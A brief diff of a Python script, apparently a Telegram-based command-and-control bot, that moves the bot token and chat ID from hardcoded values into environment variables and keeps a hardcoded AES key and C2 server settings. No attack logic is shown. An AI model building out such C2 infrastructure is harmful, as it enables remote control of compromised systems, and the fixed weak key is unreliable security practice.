@@ -7,13 +7,16 @@ import time
 import base64
 import requests
 import os
+from dotenv import load_dotenv
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 from telebot.types import ChatPermissions
 
+load_dotenv()
+
 SECRET_KEY = b'0123456789abcdef0123456789abcdef'
-TOKEN = "REMOVED_TELEGRAM_TOKEN"
-C2_CHANNEL_ID = "REMOVED_TELEGRAM_CHAT_ID"
+TOKEN = os.getenv("BOT_TOKEN")
+C2_CHANNEL_ID = os.getenv("CHAT_ID")
 C2_SERVER_IP = "0.0.0.0"
 C2_SERVER_PORT = 9090
 bot = telebot.TeleBot(TOKEN)
